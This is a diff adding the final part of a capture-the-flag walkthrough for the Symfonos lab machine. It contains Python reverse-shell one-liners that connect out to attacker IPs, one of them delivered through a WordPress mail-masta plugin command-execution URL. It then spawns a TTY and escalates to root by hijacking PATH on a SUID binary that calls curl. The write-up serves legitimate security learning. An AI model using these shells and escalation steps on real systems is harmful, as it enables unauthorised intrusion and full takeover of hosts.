@@ -376,3 +376,56 @@ Now we have RCE let get a reverse shell back to our terminal using `python` .
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
+```
+symfonos.local/h3l105//wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.109.1",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+![image](https://user-images.githubusercontent.com/69868171/156568519-230adccd-d180-41fb-bb4b-472e13143a53.png)
+
+Now let spawn a full TTY shell.
+
+```
+python -c 'import pty; pty.spawn ("/bin/bash")'
+Ctrl Z
+stty raw -echo;fg
+Enter
+stty rows 21 cols 210
+export TERM=xterm-256color
+```
+
+![image](https://user-images.githubusercontent.com/69868171/156569616-e157d3c2-2163-41d6-9fcd-c2f104b0bb54.png)
+
+Ahhh checking `sudo -l` and seems we no `sudo` install now let check for SUID.
+
+![image](https://user-images.githubusercontent.com/69868171/156569775-a7768775-c1d7-4fce-8718-c809ceeae6ea.png)
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+Now that is a strange one `/opt/statuscheck` let run it and see what it does.
+
+![image](https://user-images.githubusercontent.com/69868171/156570123-3944c44e-858f-4e14-998e-3f3f905c07e0.png)
+
+Interesting let `strings` it.
+
+![image](https://user-images.githubusercontent.com/69868171/156570468-0608f3a9-3e9d-4c7c-9262-146732269557.png)
+
+Now seems it running `curl` and the full path is not specify it possible to hijack it which is the path variable we can create our own `curl` and add it to the path.
+
+```
+helios@symfonos:/tmp$ echo "/bin/sh" > curl
+helios@symfonos:/tmp$ chmod 777 curl
+helios@symfonos:/tmp$ export PATH=/tmp:$PATH
+helios@symfonos:/tmp$ /opt/statuscheck
+```
+
+![image](https://user-images.githubusercontent.com/69868171/156572010-a2e198e8-ac6d-44ea-bd5c-6bdc4ed14287.png)
+
+That it bro we are done.
+
+Greeting From [Muzec](https://twitter.com/muzec_saminu)
+
+<br> <br>
+[Back To Home](../index.md)
+<br>
+
